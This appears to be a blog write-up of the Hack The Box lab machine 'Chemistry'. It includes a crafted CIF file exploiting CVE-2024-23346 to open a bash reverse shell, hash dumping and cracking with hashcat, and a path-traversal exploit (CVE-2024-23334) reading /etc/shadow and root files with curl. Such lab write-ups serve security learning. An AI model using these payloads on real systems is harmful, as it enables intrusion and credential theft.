---
layout: post
title: 'Hack The Box - Machine Write-Up: Chemistry'
created-at: 2025-02-04
categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
---

![Machine Info Card](/docs/assets/2025-02/htb-chemistry-0.png)

## Enumeration and Analysis

First step is to look for open ports on the machine using

> nmap 10.10.11.38

for average discovery. And

> nmap -p22,5000 -sCV 10.10.11.38

for more detail on found ports:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
looks like there is a SSH and a HTTP server exposed. Checking the page on `10.10.11.38:5000`, we can see right away the "Login" and the "Register" options.

![Chemistry Landing Page](/docs/assets/2025-02/htb-chemistry-1.png)

After a couple of simple injection attempts on the login page, I go over to the registration option and create a user using "test" as both user name and password.

This immediately redirects us to the main page of the service, listing and uploading of a CIF file.

![Chemistry Upload Page](/docs/assets/2025-02/htb-chemistry-2.png)

There is a download link available for a sample file, and it looks like this:

example.cif
```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

you can directly upload and view this file, and the website will display this:

![Chemistry Analysis Page](/docs/assets/2025-02/htb-chemistry-3.png)

I then went into Google and literally typed "cif file vulnerability", and found [this](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346) website explaining `CVE-2024-23346` and how to use it to gain remote code execution.

Right then I saw the possibility of obtaining a reverse shell on the machine.

## Acquiring reverse shell

This took a bit of finagling with the file and I couldn't get any response right away. The bug was already patched on newer versions of the CIF parser lib, I went down a rabbit hole trying to compile `Python 3.11` on my Kali machine, which led me to nowhere. 

I saw that the core of the exploit was finding and executing python's `os.system` call with the desired command, so I ended up opening a python instance and manually executing every available bash/python reverse shell found on [revshells.com](https://www.revshells.com/), but no success.

At this point I imagined that there was some limitation on outward connections from the machine that I didn't know, and went looking for a writeup.

I found [this writeup on Medium](https://medium.com/@ievgenii.miagkov/htb-chemistry-a428acbf0781) by "Ievgenii Miagkov", and it gave me the tip I needed:

![Medium writeup tip](/docs/assets/2025-02/htb-chemistry-4.png)

He linked to [this](https://agrohacksstuff.io/posts/os-commands-with-python/) page, which details os command execution using Python, and it apparently has some quirks to make it work properly.

shell.cif
```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/{tun0 ip}/1337 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

Using that new os command, I was finally able to acquire reverse shell.

## Inside the machine

After acquiring reverse shell, it seems we are on a "app" specific user:

```
> id
uid=1001(app) gid=1001(app) groups=1001(app)
```

and it has a couple of interesting files:

```
> ls -l
total 24
-rw------- 1 app app 5852 Oct  9 20:08 app.py
drwx------ 2 app app 4096 Feb  2 15:45 instance
drwx------ 2 app app 4096 Oct  9 20:13 static
drwx------ 2 app app 4096 Oct  9 20:18 templates
drwx------ 2 app app 4096 Feb  2 15:45 uploads
```

Looking inside `app.py`, I saw two main things. First is that I can see the Flask secret key and database details:

```python
...
app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}
...
```

and I can also see how the login method works:

```python
...
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.password == hashlib.md5(password.encode()).hexdigest():
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Invalid credentials')
    return render_template('login.html')
...
```
it seems like it's using a simple MD5 hash for the passwords...

I then used `sqlite3` to access the `/instance/database.db` file, and looking inside the `user` table, I could retrieve existing login details:

```
main: /home/app/instance/database.db
sqlite> .tables
.tables
structure  user     
sqlite> SELECT * FROM user;
SELECT * FROM user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
...
```

There were other users on the database, but looking at the names, I think they are all other players:

```
...
15|aaaaa|74b87337454200d4d33f80c4663dc5e5
16|a|0cc175b9c0f1b6a831c399e269772661
17|bbbb|65ba841e01d6db7733e90a5b7f9e6f80
18|birkof|f0f76fe7b54321f843dc5dcf795cdc1b
19|aaaaaaa|92eb5ffee6ae2fec3ad71c777531578f
20|t1rant|0cc175b9c0f1b6a831c399e269772661
21|test|098f6bcd4621d373cade4e832627b4f6            <-- me
22|aa|0cc175b9c0f1b6a831c399e269772661
23|123|202cb962ac59075b964b07152d234b70
```

I then used a online MD5 generator to confirm that my plain-text password "test" matched the field when hashed.

## Privilege Escalation: User

Using `hashcat` to lookup MD5 hashes on a database, I was able to get a couple of frequently used passwords:

```
> hashcat -m 0 passwords.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

...

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

9ad48828b0955513f7cf0f7f6510c8f8:carlos123                
6845c17d298d95aa942127bdad2ceb9b:peterparker              
c3601ad2286a4293868ec2a4bc606ba3:victoria123              
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
...
```

Checking back on the database, they belong to:

| username | hash                             | password          |
|-:--------|-:--------------------------------|-:-----------------|
| carlos   | 9ad48828b0955513f7cf0f7f6510c8f8 | carlos123         |
| peter    | 6845c17d298d95aa942127bdad2ceb9b | peterparker       |
| victoria | c3601ad2286a4293868ec2a4bc606ba3 | victoria123       |
| rosa     | 63ed86ee9f624c7b14f1d4f43dc251a5 | unicorniosrosados |

I checked their system logins for any data, but they were all empty.

While exploring the machine earlier I previously saw that there is another profile on the machine called "rosa":

```
> ls -l ../
total 8
drwxr-xr-x 8 app  app  4096 Oct  9 20:18 app
drwxr-xr-x 5 rosa rosa 4096 Jun 17  2024 rosa
```

Is it possible that she is re-using password?

```
> ssh rosa@10.10.11.38    
The authenticity of host '10.10.11.38 (10.10.11.38)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.38' (ED25519) to the list of known hosts.
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
...
```

yes 😂

on her home directory, you can find the user flag:
```
> ls -l
total 4
-rw-r----- 1 root rosa 33 Feb  2 16:07 user.txt
```

## Privilege Escalation: Root

First of all, check if rosa has sudo access.

```
> sudo su
[sudo] password for rosa: 
rosa is not in the sudoers file.  This incident will be reported.
```

I tryied executing [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2/tree/master) on the machine, but got nothing

```
> touch es.pl
> nano es.pl 
> chmod +x es.pl 
> ./es.pl 

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 5.4.0
  Searching 72 exploits...

  Possible Exploits

  No exploits are available for this kernel version
```

Looking up files with SUID flag

> A file with SUID always executes as the user who owns the file, regardless of the user passing the command

```
> find / -perm -u=s -type f 2>/dev/null
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
```

`/usr/lib/policykit-1/polkit-agent-helper-1` looks different from what a normal Linux process would look like...

Looking up "polkit suid exploit" on Google: [Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug](https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/). Ooops..

No luck though, the machine doesn't have the necessary `accountsservice` and `gnome-control-center` packages.

I also found this possible angle using [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```
...
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                 
                      ╚════════════════════════════════════╝                                                       
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                    
-rwsr-xr-x 1 root root 133K Apr 24  2024 /snap/snapd/21759/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
...
```

But wasn't able to make the exploit work.

---

At this point I have given up, and went to take a look at the writeup again...

This was kinda weird, he mentioned the use of
> ss -lvn

this will display open TCP ports in numeric format, specially numeric format since without the `-n` flag, port `8080` would be displayed as `http-alt`.

This command shows that there is a non exposed HTTP page running on port `8080`:
```
> ss -lnt
State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port       Process       
LISTEN       0            128                    127.0.0.1:8080                   0.0.0.0:*                        
LISTEN       0            4096               127.0.0.53%lo:53                     0.0.0.0:*                        
LISTEN       0            128                      0.0.0.0:22                     0.0.0.0:*                        
LISTEN       0            5                        0.0.0.0:3333                   0.0.0.0:*                        
LISTEN       0            128                      0.0.0.0:5000                   0.0.0.0:*                        
LISTEN       0            128                         [::]:22                        [::]:* 
```

and to access it outside of the SSH connection, we need to port forward it.

> ssh -L 8080:localhost:8080 rosa@10.10.11.38

I can now navigate to `localhost:8080` and see the landing page:

![Port 8080 landing page](/docs/assets/2025-02/htb-chemistry-5.png)

The only option that seems to work there is the "List Services", but it doesn't seem to have nothing different from what I could find connecting directly to the machine through SSH.

Using `Burp Suite` I can see that the response is coming from a `Python/3.9 aiohttp/3.9.1` server.

Quick Google for "aiohttp vulnerability" and I can see that it is [susceptible for directory traversal attacks](https://pentest-tools.com/vulnerabilities-exploits/aiohttp-directory-traversal_22528) (`CVE-2024-23334`).

I used the [PoC](https://github.com/z3rObyte/CVE-2024-23334-PoC/tree/main) to map out the possibilities:

```
> ./poc.sh 
[+] Testing with /static/../etc/passwd
        Status code --> 404
[+] Testing with /static/../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../../../../../../../../etc/passwd
        Status code --> 404
[+] Testing with /static/../../../../../../../../../../../../../../../etc/passwd
        Status code --> 404
```

but no luck.

Running the website through `gobuster` showed that the `/static` path actually doesn't exist. But the `/assets` does.

```
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 403) [Size: 14]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Found path traversal under `/assets/../../../`: 

```
> ./poc.sh                                                                     
[+] Testing with /assets/../etc/passwd
        Status code --> 404
[+] Testing with /assets/../../etc/passwd
        Status code --> 404
[+] Testing with /assets/../../../etc/passwd
        Status code --> 200
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

Getting the `/etc/shadow` file:

```
> curl -s --path-as-is "http://localhost:8080/assets/../../../etc/shadow"
root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
...
```

Quick look under the [shadow file documentation](https://www.cyberciti.biz/faq/understanding-etcshadow-file/) it seems that this password is stored as SHA-512.

I tried running the password through `hashcat` in case it was known easy password, but no luck:

```
> hashcat root.pws.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

...

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System

...

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW6...BkRpl.
Time.Started.....: Tue Feb  4 01:31:04 2025 (1 hour, 6 mins)
Time.Estimated...: Tue Feb  4 02:37:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3579 H/s (0.97ms) @ Accel:512 Loops:64 Thr:1 Vec:2
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 50%
```

If the root password is not present on the `rockyou.txt` word list, I imagine that the password is not supposed to be cracked on this context.

I then had a interesting idea. Since the path traversal happen over HTTP, I can use `gobuster` to comb through the directories:

```
> gobuster dir -u http://localhost:8080/assets/../../../ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/assets/../../../
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 403) [Size: 14]
/boot                 (Status: 403) [Size: 14]
/dev                  (Status: 403) [Size: 14]
/etc                  (Status: 403) [Size: 14]
/home                 (Status: 403) [Size: 14]
/lib                  (Status: 403) [Size: 14]
/lost+found           (Status: 403) [Size: 14]
/media                (Status: 403) [Size: 14]
/opt                  (Status: 403) [Size: 14]
/proc                 (Status: 403) [Size: 14]
/root                 (Status: 403) [Size: 14]   <-- had forgotten about this
/run                  (Status: 403) [Size: 14]
/sbin                 (Status: 403) [Size: 14]
/srv                  (Status: 403) [Size: 14]
/sys                  (Status: 403) [Size: 14]
/tmp                  (Status: 403) [Size: 14]
/usr                  (Status: 403) [Size: 14]
/var                  (Status: 403) [Size: 14]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
```

Then looking through `/root`:

```
> gobuster dir -u http://localhost:8080/assets/../../../root/ -x txt -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/assets/../../../root/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.cache               (Status: 403) [Size: 14]
/.bashrc              (Status: 200) [Size: 3106]
/.ssh                 (Status: 403) [Size: 14]
/.profile             (Status: 200) [Size: 161]
/root.txt             (Status: 200) [Size: 33]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
```

Nice, I can now just retrieve the root flag using:

> curl -s --path-as-is "http://localhost:8080/assets/../../../root/root.txt" 